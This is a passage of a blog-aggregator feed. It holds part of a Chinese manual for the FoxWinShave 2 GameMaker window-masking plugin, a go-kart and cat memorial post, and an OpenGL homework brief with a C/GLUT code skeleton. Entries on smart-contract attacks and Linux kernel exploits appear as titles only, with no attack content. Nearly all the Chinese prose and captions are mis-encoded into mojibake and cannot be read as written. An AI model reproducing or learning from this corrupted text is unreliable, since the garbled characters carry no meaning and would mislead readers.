<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/purpose.png" target="_blank" rel="noreferrer noopener"><img src="https://www.noisyfox.io/wp-content/uploads/2019/01/purpose-1.png" alt="" class="wp-image-661" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/purpose-1.png 640w, https://www.noisyfox.io/wp-content/uploads/2019/01/purpose-1-300x225.png 300w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption>æ¸¸æˆå®é™…ç»˜åˆ¶å†…å®¹</figcaption></figure></div>



<p>ä¸Šå›¾ä¸­ï¼Œå¥³ç‰›ä»”çš„éƒ¨åˆ†æ˜¯æœ‰æ„ä¹‰çš„ã€éœ€è¦ä¿ç•™çš„éƒ¨åˆ†ï¼Œè€Œé»‘è‰²èƒŒæ™¯éœ€è¦è¢«è£å‰ªæ‰ï¼Œä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬åœ¨é®ç½©å±‚â€œç»˜åˆ¶â€çš„é®ç½©éœ€è¦ä¸å¥³ç‰›ä»”çš„ä½ç½®ã€å½¢çŠ¶ç›¸åŒã€‚</p>



<p>è¿™ä¹ä¸€å¬ä¼¼ä¹å¾ˆå®¹æ˜“ï¼Œåªè¦ä½¿ç”¨ç›¸åŒçš„ xï¼Œy å‚æ•°å°†åŒæ ·çš„å¥³ç‰›ä»” Sprite ç»˜åˆ¶åˆ° Application Surface å’Œé®ç½©å±‚å³å¯ã€‚ä½†æ˜¯æ­£å¦‚ä¸Šæ–‡æ‰€è¯´ï¼Œç”¨æˆ·å®é™…çœ‹åˆ°çš„å†…å®¹æ˜¯ç»è¿‡ View Port å˜æ¢è¿‡çš„ï¼Œå› æ­¤å…¶å®é™…æ˜¾ç¤ºçš„åæ ‡å’Œå°ºå¯¸å¯èƒ½ä¸ç»˜åˆ¶æ—¶ä¼ å…¥çš„å‚æ•°ä¸åŒï¼›ç„¶è€Œé®ç½©å±‚æ˜¯ä¸å— View Port å½±å“çš„ï¼Œå› æ­¤å¼€å‘è€…éœ€è¦è‡ªè¡Œè®¡ç®—é®ç½©å±‚å›¾åƒçš„ä½ç½®å’Œå°ºå¯¸ï¼Œç”¨ä»¥å¯¹é½ç»è¿‡ View Port å˜æ¢åçš„æ¸¸æˆå†…å®¹ã€‚å»ºè®®ä¸è¦ç”¨è¿‡äºå¤æ‚çš„ View Port è®¾ç½®ã€‚</p>



<h4>2.3.4 çª—å£å½¢çŠ¶æ›´æ–°æ—¶é—´ä¸ç»˜åˆ¶äº‹ä»¶é¡ºåº</h4>



<p>ç”±äº GM è¿è¡ŒåŸç†æ‰€è‡´ï¼Œæ¸¸æˆç»˜åˆ¶çš„å†…å®¹å¹¶ä¸ä¼šåœ¨ç»˜åˆ¶è¯­å¥æ‰§è¡Œçš„ç¬é—´æ˜¾ç¤ºå‡ºæ¥ï¼Œè€Œæ˜¯è¦ç­‰åˆ°å½“å‰ Step æ‰€æœ‰ç»˜åˆ¶å®Œæˆåæ‰ä¼šåˆ·æ–°ç»˜åˆ¶ç¼“å­˜ä»¥æ˜¾ç¤ºç»˜åˆ¶çš„å†…å®¹ã€‚è¿™æ„å‘³ç€çª—å£å¤–å½¢çš„æ›´æ–°éœ€è¦ä¸ç»˜åˆ¶å†…å®¹çš„åˆ·æ–°åŒæ­¥å‘ç”Ÿï¼Œå¦åˆ™å°±ä¼šå‘ç”Ÿçª—å£å½¢çŠ¶ä¸æ‰€æ˜¾ç¤ºå†…å®¹æœ‰æ‰€åå·®çš„é—®é¢˜ï¼ˆæ¯”å¦‚æ¸¸æˆä»ç„¶æ˜¾ç¤ºçš„æ˜¯ä¸Šä¸€å¸§çš„å†…å®¹ï¼Œä½†æ˜¯çª—å£å½¢çŠ¶å·²ç»è¢«è£å‰ªæˆäº†ä¸‹ä¸€å¸§æ‰€éœ€çš„å½¢çŠ¶ï¼‰ï¼š</p>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/image-4.png" target="_blank" rel="noreferrer noopener"><img src="https://www.noisyfox.io/wp-content/uploads/2019/01/image-4.png" alt="" class="wp-image-669"/></a><figcaption> <br>ç»˜åˆ¶å†…å®¹ä¸çª—å£å½¢çŠ¶æ²¡æœ‰åŒæ­¥æ›´æ–° </figcaption></figure></div>



<p>ç”±äº Windows çª—å£å¤–å½¢æ›´æ–°æ—¶æœºæ‰€é™ï¼Œæœ¬æ’ä»¶éœ€è¦åœ¨ GM çš„æ¯ä¸ª Step ä¸­ï¼Œäºæ¯ä¸ª Step å¼€å§‹ ï¼ˆBegin Stepï¼‰è‡³ Draw ç³»åˆ—äº‹ä»¶å¼€å§‹ä¹‹å‰å¯¹çª—å£å½¢çŠ¶è¿›è¡Œæ›´æ–°ï¼Œä»¥ä¿è¯çª—å£å½¢çŠ¶çš„æ›´æ–°ä¸ç»˜åˆ¶å†…å®¹çš„æ›´æ–°èƒ½å¤ŸåŒæ­¥å®Œæˆã€‚å¦‚æœåœ¨ Draw ç³»åˆ—äº‹ä»¶ä¸­è¿›è¡Œçª—å£å½¢çŠ¶çš„ä¿®æ”¹ï¼Œåˆ™ä¼šå‘ç”Ÿçª—å£å½¢çŠ¶ä¸ç»˜åˆ¶å†…å®¹ä¸åŒæ­¥çš„é—®é¢˜ï¼Œè¯·åŠ¡å¿…æ³¨æ„ã€‚å»ºè®®åœ¨ End Step äº‹ä»¶ä¹‹ä¸­æ›´æ–°çª—å£å½¢çŠ¶ã€‚</p>



<p>å†æ¬¡æç¤ºï¼Œè¯·<strong>ä¸è¦</strong>åœ¨ Draw <strong>ç³»åˆ—</strong>äº‹ä»¶ä¸­æ›´æ–°çª—å£å½¢çŠ¶ï¼é™¤éä½ ååˆ†æ¸…æ¥šå¯èƒ½å‘ç”Ÿçš„åæœï¼</p>



<h3>2.4 å¤æ‚é®ç½©</h3>



<p>å¤šæ¬¡æ‰§è¡Œä»¥ä¸‹ä»»æ„æ ¸å¿ƒå‡½æ•°æ¥æ”¹å˜çª—å£å½¢çŠ¶ï¼Œåˆ™åä¸€æ¬¡çš„é®ç½©å°†ä¼šè¦†ç›–å‰ä¸€æ¬¡çš„é®ç½©ï¼Œ<strong>å¹¶ä¸ä¼š</strong>äº’ç›¸å åŠ ï¼š</p>


<pre class="brush: cpp; title: ; notranslate">
NF_WS_ShaveWindow(sprite, subimage, x, y);
NF_WS_ShaveWindowAlpha(sprite, subimage, x, y, alpha);
NF_WS_ShaveWindowExt(sprite, subimage, x, y, xscale, yscale, alpha);
NF_WS_ShaveWindowSurfaceExt(surface, x, y, xscale, yscale, alpha); // ä»…é™ GMS
</pre>


<p>è¿™æ„å‘³ç€å¦‚æœæ‰€éœ€çš„é®ç½©æ˜¯ç”±å¤šä¸ªå…ƒç´ ç»„åˆè€Œæˆçš„å¤æ‚å½¢çŠ¶ï¼Œåˆ™éœ€è¦å¼€å‘è€…è‡ªè¡Œå‡†å¤‡å¥½å·²ç»äº‹å…ˆç»„åˆå¥½æ‰€æœ‰å…ƒç´ çš„<strong>å•å¼ </strong> Sprite / Surface ç”¨ä½œå®é™…çš„é®ç½©ã€‚</p>



<p>ä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœä½ éœ€è¦åœ¨å±å¹•ä¸Šæ˜¾ç¤ºä¸¤ä½å¥³ç‰›ä»”ï¼Œé‚£ä¹ˆä½ éœ€è¦å‡†å¤‡å¦‚ä¸‹çš„<strong>ä¸€å¼ </strong> Sprite / Surface ä½œä¸ºé®ç½©ï¼š</p>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/complex.png" target="_blank" rel="noreferrer noopener"><img src="https://www.noisyfox.io/wp-content/uploads/2019/01/complex.png" alt="" class="wp-image-678" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/complex.png 640w, https://www.noisyfox.io/wp-content/uploads/2019/01/complex-300x225.png 300w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption>å¤æ‚é®ç½©</figcaption></figure></div>



<p>è¿ç»­è°ƒç”¨ä¸¤æ¬¡ NF_WS_ShaveWindow_* å‡½æ•°å¹¶ä¸èƒ½å®ç°å¦‚ä¸Šæ‰€è¿°çš„éœ€æ±‚ã€‚å‡è®¾ç¬¬ä¸€æ¬¡ä¼ å…¥äº†å·¦ä¾§ç‰›ä»”çš„é®ç½©ï¼Œç¬¬äºŒæ¬¡ä¼ å…¥äº†å³ä¾§çš„é®ç½©ï¼Œåˆ™åªæœ‰å³ä¾§ä¼šæ­£å¸¸æ˜¾ç¤ºå‡ºæ¥ï¼Œè€Œç¬¬ä¸€æ¬¡è®¾ç½®çš„é®ç½©ä¼šè¢«è¦†ç›–è€Œå¤±æ•ˆã€‚</p>



<hr class="wp-block-separator"/>



<h2>3. å¸¸è§é—®é¢˜</h2>



<ol><li>ä½¿ç”¨ Sprite åšé®ç½©æ—¶è¦æ³¨æ„æ‰€ç”¨ Sprite çš„ xoffset å’Œ yoffsetã€‚</li></ol>
<p><a rel="nofollow" href="https://www.noisyfox.io/foxwinshave2.html">FoxWinShave 2 ä¸­æ–‡ä½¿ç”¨æ‰‹å†Œ</a>ï¼Œé¦–å‘äº<a rel="nofollow" href="https://www.noisyfox.io">ç‹ç‹¸çš„å°å°çª</a>ã€‚</p>]]></content>
        <author>
            <name><![CDATA[ç‹ç‹¸çš„å°å°çª]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://doublemice.github.io/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%94%BB%E5%87%BB%E9%9D%A2%E5%8F%8Actf%E5%87%BA%E9%A2%98%E6%8C%87%E5%8D%97/</id>
        <title><![CDATA[æ™ºèƒ½åˆçº¦æ”»å‡»é¢åŠctfå‡ºé¢˜æŒ‡å—]]></title>
        <updated>2019-01-03T00:00:00+08:00</updated>
        <link href="https://doublemice.github.io/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%94%BB%E5%87%BB%E9%9D%A2%E5%8F%8Actf%E5%87%BA%E9%A2%98%E6%8C%87%E5%8D%97/"/>
        <content type="text/html" src="https://doublemice.github.io/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%94%BB%E5%87%BB%E9%9D%A2%E5%8F%8Actf%E5%87%BA%E9%A2%98%E6%8C%87%E5%8D%97/"><![CDATA[æ™ºèƒ½åˆçº¦æ”»å‡»é¢åŠctfå‡ºé¢˜æŒ‡å—]]></content>
        <author>
            <name><![CDATA[DoubleMice]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.karlrixon.cn/2018/11/06/%E5%8D%A1%E4%B8%81%E8%BD%A6%E4%B8%8E%E7%8C%AB/</id>
        <title><![CDATA[å¡ä¸è½¦ä¸çŒ«]]></title>
        <updated>2018-11-25T13:28:17+08:00</updated>
        <link href="http://blog.karlrixon.cn/2018/11/06/%E5%8D%A1%E4%B8%81%E8%BD%A6%E4%B8%8E%E7%8C%AB/"/>
        <content type="text/html" src="http://blog.karlrixon.cn/2018/11/06/%E5%8D%A1%E4%B8%81%E8%BD%A6%E4%B8%8E%E7%8C%AB/"><![CDATA[<p>æœ¬æ¥æ‰“ç®—æ‹¿çº¸åšä¸ªæ¶å­æŠŠæ‰‹æœºå›ºå®šåœ¨å¸½å­ä¸Šå…¨ç¨‹æ‹æ‘„<br>ç„¶è€Œè¿‡å¼¯åŠ›åº¦å¤ªå¤§æ‰‹æœºå·¦æ™ƒå³æ™ƒæœ€åè¿˜æ˜¯ç”©äº†å‡ºå»<br>å°±æ–‡å­—åˆ†äº«ä¸€ä¸‹ä¿Šèˆªå¡ä¸è½¦çš„ä½“éªŒå§<br>ä¸Šè½¦åå·¥ä½œäººå‘˜å‘è½¦å‘äº†å¥½å‡ æ¬¡éƒ½æ²¡å‘ç€æœ‰ç‚¹å°å°´å°¬<br>ç¬¬ä¸€è„šå¬åˆ°æ²¹é—¨é©¬è¾¾çš„è½°é¸£å£°ç«‹åˆ»æœ‰ç§é©¾é©­é‡å…½çš„æ„Ÿè§‰<br>å…ˆä¸æ€¥ç¬¬ä¸€åœˆæ¨¡ä»¿f1æš–èƒ<br>åœ¨èµ›é“ä¸Šå·¦å³æ‘‡æ‘†é²¨é±¼å·¡èˆª<br>å®¤å†…èµ›é“é•¿åº¦è¾ƒçŸ­ä½†è·¯é¢å¹³æ•´å¾—ç”šè‡³åå…‰å¾ˆé€‚åˆæ¼‚ç§»<br>è½¦èº«å¾ˆç¨³åœ°æ‘‡å®Œç¬¬ä¸€åœˆ<br>ç¬¬äºŒåœˆå¼€å¯è¿åŠ¨æ¨¡å¼<br>åŸè°…æˆ‘æ˜¯ä¸ªé”®ç›˜è½¦æ‰‹æ²¹é—¨åªä¼šè¸©åˆ°åº•<br>åŠ é€Ÿæ„Ÿè¶…å¼ºå…¥ç¬¬ä¸€ä¸ªå¼¯å‰é€Ÿåº¦ä¼°è®¡æœ‰30è¿ˆ<br>å‡é€Ÿ è´´è¾¹ çŒ›æ‰“æ–¹å‘ç›˜ æ²¹é—¨è¸©åˆ°åº• æ–¹å‘ç›˜åæ‰“<br>ç»“æœå·®ç‚¹é£˜äº†180åº¦<br>ä½†è¿˜æ˜¯ä¸å¯é¿å…çš„æ’äº†è·¯è¾¹è½®èƒ<br>ç†Ÿæ‚‰æ‰‹æ„Ÿåå°±æ”¾å¼€äº†<br>è™½ç„¶åœ°æ–¹å°ä½†å¼¯é“çš„å¸ƒç½®å¾ˆåˆç†<br>æ¼‚ç§»æ—¶skrskrskr~å¾ˆåˆºæ¿€~<br>åŠªåŠ›å……åˆ†åˆ©ç”¨èµ›é“æ„Ÿè§‰è‡ªå·±èµ°çº¿è¿˜å¯ä»¥~<br>æˆ‘ä¸ºè½¦ç‹‚ï¼ï¼ï¼</p><hr><p>ä¸€å¹´å‰çš„12æœˆï¼Œå¤§å¯æœ‰äººä»ç«é”…åº—è€æ¿é‚£é‡Œæ”¶äº†åªå¹¼çŒ«ï¼Œä»æ­¤å¼€å§‹äº†æœ‰çŒ«é™ªä¼´çš„æ—¥å­ã€‚<br>å¦‚ä»ŠçŒ«å’ªå·²ç»ä¸åœ¨ï¼Œè´´ç‚¹ç…§ç‰‡å’Œè§†é¢‘è¡¨è¾¾ä¸€ä¸‹å¯¹å®ƒçš„æƒ³å¿µã€‚</p><iframe src="//player.bilibili.com/player.html?aid=35436376&cid=62120907&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="width:100%;height:700px"> </iframe><p><img src="https://qiniu.karlrixon.cn/blog/181106/l7Eakg44il.png?imageslim" alt="mark"></p><p><img src="https://qiniu.karlrixon.cn/blog/181106/mFfbFG81B7.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/dl7LHkc4mj.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/fI83g5gcDB.png?imageslim" alt="mark"></p><p><img src="https://qiniu.karlrixon.cn/blog/181106/cd0Kmd8igj.png?imageslim" alt="mark"></p><p>è¿™å¼ å¥½ä¸‘233</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/d0LbeC0d43.png?imageslim" alt="mark"></p><p>å°ç¯ä¸‹å°±é€‚åˆæ€è€ƒ</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/DHHk9LAKgf.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/J8L798EBda.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/Djem79cGa6.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/2460HE0mfJ.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/EdCAhFh0Bh.png?imageslim" alt="mark"></p><p>å°è¯•æœ€èˆ’æœçš„ç¡å§¿ã€‚ã€‚</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/EeDAkDB6bc.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/8cFBhjj9Ac.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/HGJ0gIK2bI.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/aE8bf81maD.png?imageslim" alt="mark"></p><p>æ•ç€ç®—æ³•ä¹¦ç¡è§‰</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/DIbjJ6Cjhk.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/deAFbCe92G.png?imageslim" alt="mark"></p><p>æˆ‘æ˜¯0æ’æ·è±¹QAQ</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/0kghK3mdKE.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/HIdB16aLb7.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/4BBIk4L2CE.png?imageslim" alt="mark"></p><p>ä¸“å¿ƒç‚¹ï¼</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/jj036eiHGj.png?imageslim" alt="mark"></p><p>ä½ æ„å•¥</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/bJ1iibhiCH.png?imageslim" alt="mark"></p><p><img src="https://qiniu.karlrixon.cn/blog/181106/DFLAIjKdjI.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/0alG7LB41h.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/h50ghHDb7a.png?imageslim" alt="mark"></p><p>è¿™æ˜¯è€é¼ å—</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/7khdeha147.png?imageslim" alt="mark"></p><p>è€é¼ å°±è¿™å‘³ï¼Ÿ</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/BD6H22j4Bi.png?imageslim" alt="mark"></p><p>ä½ éª—è°å‘¢</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/bklELf1b5K.png?imageslim" alt="mark"></p><p>æ‚Ÿç©º</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/Lb9162KEC6.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/0Ddb9CgJFb.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181106/m43dfK70cb.png?imageslim" alt="mark"></p><p>æƒ³ä½ äº†å–µ</p><p><img src="https://qiniu.karlrixon.cn/blog/181106/CHj5e6cEde.png?imageslim" alt="mark"></p>]]></content>
        <author>
            <name><![CDATA[KarlRixonâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://doublemice.github.io/Todo-List/</id>
        <title><![CDATA[Todo List]]></title>
        <updated>2018-11-23T00:00:00+08:00</updated>
        <link href="https://doublemice.github.io/Todo-List/"/>
        <content type="text/html" src="https://doublemice.github.io/Todo-List/"><![CDATA[Todo List]]></content>
        <author>
            <name><![CDATA[DoubleMice]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://doublemice.github.io/The-road-to-linux-kernel-exploit/</id>
        <title><![CDATA[The Road To Linux Kernel Exploit]]></title>
        <updated>2018-11-22T00:00:00+08:00</updated>
        <link href="https://doublemice.github.io/The-road-to-linux-kernel-exploit/"/>
        <content type="text/html" src="https://doublemice.github.io/The-road-to-linux-kernel-exploit/"><![CDATA[The Road To Linux Kernel Exploit]]></content>
        <author>
            <name><![CDATA[DoubleMice]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.karlrixon.cn/2018/10/20/%E7%AB%9E%E9%80%9F%E6%B8%B8%E6%88%8F%E5%BD%95%E5%B1%8F%E5%89%AA%E8%BE%91/</id>
        <title><![CDATA[ç«é€Ÿæ¸¸æˆå½•å±å‰ªè¾‘]]></title>
        <updated>2018-11-11T11:07:14+08:00</updated>
        <link href="http://blog.karlrixon.cn/2018/10/20/%E7%AB%9E%E9%80%9F%E6%B8%B8%E6%88%8F%E5%BD%95%E5%B1%8F%E5%89%AA%E8%BE%91/"/>
        <content type="text/html" src="http://blog.karlrixon.cn/2018/10/20/%E7%AB%9E%E9%80%9F%E6%B8%B8%E6%88%8F%E5%BD%95%E5%B1%8F%E5%89%AA%E8%BE%91/"><![CDATA[<iframe src="//player.bilibili.com/player.html?aid=27825157&cid=48041818&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="width:100%;height:700px"> </iframe>]]></content>
        <author>
            <name><![CDATA[KarlRixonâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.karlrixon.cn/2018/10/14/OpenGL%E8%AE%BE%E8%AE%A1%E5%B0%8F%E5%B1%8B%E5%9C%BA%E6%99%AF/</id>
        <title><![CDATA[OpenGLè®¾è®¡å°å±‹åœºæ™¯]]></title>
        <updated>2018-11-11T11:06:00+08:00</updated>
        <link href="http://blog.karlrixon.cn/2018/10/14/OpenGL%E8%AE%BE%E8%AE%A1%E5%B0%8F%E5%B1%8B%E5%9C%BA%E6%99%AF/"/>
        <content type="text/html" src="http://blog.karlrixon.cn/2018/10/14/OpenGL%E8%AE%BE%E8%AE%A1%E5%B0%8F%E5%B1%8B%E5%9C%BA%E6%99%AF/"><![CDATA[<h2 id="Grading-Scheme"><a href="#Grading-Scheme" class="headerlink" title="Grading Scheme"></a>Grading Scheme</h2><p>Your assignment will be graded by the following marking scheme:<br>Basic (80%)</p><ul><li>Planes (the left, right, and back walls, the ceiling and the floor)  10%</li><li>At least five different geometric primitives                  20%</li><li>At least five keyboard events (mouse event is optional)        15%</li><li>Object transformation animation (rotation, translating, scaling)  15%</li><li>General lighting control (different material properties setting)   20%</li></ul><p>Bonus (Up to 20%)</p><ul><li>Well-organized room                                       5%</li><li>Complex meaningful object constructed by different primitives      5%</li><li>Additional light (with different properties, on/off or transformation)  10%</li><li>Other creativities                                           10%</li></ul><p>Total                                                       100%<br>Note: No grade will be given if the program is incomplete.</p><h2 id="ä»£ç æ¡†æ¶è§£è¯»"><a href="#ä»£ç æ¡†æ¶è§£è¯»" class="headerlink" title="ä»£ç æ¡†æ¶è§£è¯»"></a>ä»£ç æ¡†æ¶è§£è¯»</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;GL/glut.h&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> GLdouble FRUSTDIM = <span class="number">100.0f</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">void</span>)</span> <span class="comment">// All Setup For OpenGL Goes Here</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">glEnable(GL_DEPTH_TEST);</span><br><span class="line">glEnable(GL_LIGHTING);</span><br><span class="line">glEnable(GL_LIGHT0);</span><br><span class="line">glClear(GL_DEPTH_BUFFER_BIT | GL_COLOR_BUFFER_BIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(<span class="keyword">void</span>)</span> <span class="comment">// Here's Where We Do All The Drawing</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line"><span class="comment">// Place light source here</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line"><span class="comment">// Draw walls and objects here</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line"><span class="comment">// Add animation here</span></span><br><span class="line"></span><br><span class="line">glutSwapBuffers();</span><br><span class="line">glFlush();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reshape</span><span class="params">(<span class="keyword">int</span> w, <span class="keyword">int</span> h)</span> <span class="comment">// Resize the GL Window. w=width, h=height</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">glViewport(<span class="number">0</span>, <span class="number">0</span>, (GLsizei) w, (GLsizei) h);</span><br><span class="line">glMatrixMode(GL_PROJECTION);</span><br><span class="line">glLoadIdentity();</span><br><span class="line">glFrustum(-FRUSTDIM, FRUSTDIM, -FRUSTDIM, FRUSTDIM, <span class="number">320.</span>, <span class="number">640.</span>);</span><br><span class="line">glMatrixMode(GL_MODELVIEW);</span><br><span class="line">glLoadIdentity();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">keyboard</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> key, <span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> <span class="comment">// Handle the keyboard events here</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">switch</span> (key) </span><br><span class="line">   &#123;</span><br><span class="line">   <span class="keyword">case</span>'\<span class="number">033'</span>:<span class="comment">//press 'esc' to quit</span></span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line">   <span class="comment">// Add keyboard control here</span></span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">idle</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Initialization of GLUT Library */</span></span><br><span class="line">glutInit(&amp;argc, argv);</span><br><span class="line">glutInitDisplayMode(GLUT_RGBA|GLUT_DOUBLE|GLUT_DEPTH);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Create a window with title specified */</span></span><br><span class="line">glutCreateWindow(<span class="string">"Assignment 1"</span>);</span><br><span class="line">glutInitWindowSize(<span class="number">800</span>, <span class="number">600</span>);</span><br><span class="line">glutInitWindowPosition(<span class="number">100</span>, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">init();<span class="comment">/*not GLUT call, initialize several parameters */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*Register different CALLBACK function for GLUT to response </span></span><br><span class="line"><span class="comment">with different events, e.g. window sizing, mouse click or</span></span><br><span class="line"><span class="comment">keyboard stroke */</span></span><br><span class="line">glutReshapeFunc(reshape);</span><br><span class="line">glutDisplayFunc(display);</span><br><span class="line">glutKeyboardFunc(keyboard);</span><br><span class="line">glutIdleFunc(idle);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Enter the GLUT event processing loop which never returns.</span></span><br><span class="line"><span class="comment">it will call different registered CALLBACK according</span></span><br><span class="line"><span class="comment">to different events. */</span></span><br><span class="line">glutMainLoop();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ä¿®æ”¹å’Œè¡¥å……"><a href="#ä¿®æ”¹å’Œè¡¥å……" class="headerlink" title="ä¿®æ”¹å’Œè¡¥å……"></a>ä¿®æ”¹å’Œè¡¥å……</h2><p>ä½œä¸šæ¡†æ¶ä¸­çš„ä¸€å¤„bugï¼š<code>main</code>å‡½æ•°ä¸­<code>glutCreateWindow</code>åº”å½“åœ¨<code>glutInitWindowSize</code>å’Œ<code>glutInitWindowPosition</code>ä¹‹åã€‚</p><p>åœ¨initå‡½æ•°ä¸­æ·»åŠ 